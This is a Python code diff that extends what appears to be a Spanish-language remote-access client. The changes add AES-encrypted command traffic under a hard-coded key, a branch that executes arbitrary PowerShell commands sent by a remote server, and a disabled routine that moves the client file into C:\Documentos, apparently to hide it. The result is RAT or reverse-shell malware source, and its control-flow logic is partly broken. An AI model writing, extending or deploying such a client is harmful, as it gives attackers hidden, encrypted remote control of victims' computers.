@@ -5,6 +5,7 @@ import asyncio
 import base64
 import mss
 import struct
+import shutil
 project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
 sys.path.insert(0, project_root)
 
@@ -15,10 +16,14 @@ class AsyncClient:
     def __init__(self, host='127.0.0.1', port=65432):
         self.host = host
         self.port = port
+        key = b"thisis16byteskey"
+        self.encryptor = AESEncryptor(key)
         self.commands = crocodile()
+
 
     async def connect(self):
         reader, writer = await asyncio.open_connection(self.host, self.port)
+        # self.moving()
         current_dir = os.getcwd()
         res_dir = current_dir.encode("utf-8")
         print(res_dir)
@@ -26,14 +31,17 @@ class AsyncClient:
         while True:
             try:
                 data = await reader.read(1024)
-                command = data.decode()
+                # response  = data.decode('utf-8', errors='ignore')
+                decrypted_response = self.encryptor.decrypt(data)
+                command = decrypted_response.decode()
                 print(f"Comando recibido: {command}")
                 if command.startswith("cd "):
                     path = command[3:]
                     if os.path.exists(path) and os.path.isdir(path):
                         os.chdir(path)
-                        current_dir = os.getcwd()     
-                        writer.write(current_dir.encode('utf-8'))
+                        current_dir = os.getcwd()   
+                        encrypt = self.encryptor.encrypt(current_dir)  
+                        writer.write(encrypt)
                         await writer.drain()  # Enviar los datos
                         print(current_dir)
                 elif command.startswith("ls") or command.startswith("dir"):
@@ -91,8 +99,38 @@ class AsyncClient:
                         writer.write(struct.pack("!I", 4))  # Longitud de "fail"
                         writer.write(base64.b64encode(b"fail"))
                         await writer.drain()
-                else:
-                     writer.write(b"Comando incorrecto.")
+                
+                elif command.startswith("powershell"):
+                    try:
+                        ps_command = command[11:] 
+                        
+                        proc = await asyncio.create_subprocess_shell(
+                            f'powershell.exe -Command "{ps_command}"',
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.STDOUT
+                        )
+                        
+                        # Capturar salida
+                        stdout, _ = await proc.communicate()
+                        output = stdout.decode('utf-8', errors='replace')
+                        if stdout != b'':
+                             encrypt = self.encryptor.encrypt("Comando invalido")
+                             writer.write(encrypt)
+                        # Enviar respuesta al servidor
+                        encrypCommandExecuting = self.encryptor.encrypt("Comando ejecutado correctamente")
+                        writer.write(encrypCommandExecuting)
+                        res =await reader.read(1024)
+                        decrypted_response = self.encryptor.decrypt(res)
+                        result = os.getcwd()
+                        encrypt_result = self.encryptor.encrypt(result) 
+                        writer.write(encrypt_result)
+                        
+                    except Exception as e:
+                        error_msg = f"Error PowerShell: {str(e)}"
+                        writer.write(error_msg.encode('utf-8'))
+                        await writer.drain()
+                    else:
+                        writer.write(b"Comando incorrecto.")
 
             except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
                             print("Cliente desconectado de forma inesperada.")
@@ -104,6 +142,23 @@ class AsyncClient:
     def captura_pantalla(self):
         screen = mss.mss()
         screen.shot()
+
+    def moving(self):
+        # Ruta del archivo original
+        archivo_origen = "./Client.py"
+
+        # Ruta del directorio destino
+        directorio_destino = 'C:\Documentos'
+
+        # Asegurarse de que el directorio destino existe (si no, crearlo)
+        if not os.path.exists(directorio_destino):
+            os.makedirs(directorio_destino)
+
+        # Mover el archivo
+        archivo_destino = os.path.join(directorio_destino, os.path.basename(archivo_origen))
+        shutil.move(archivo_origen, archivo_destino)
+
+        print(f"Archivo movido a: {archivo_destino}")
 
 if __name__ == "__main__":
     client = AsyncClient()
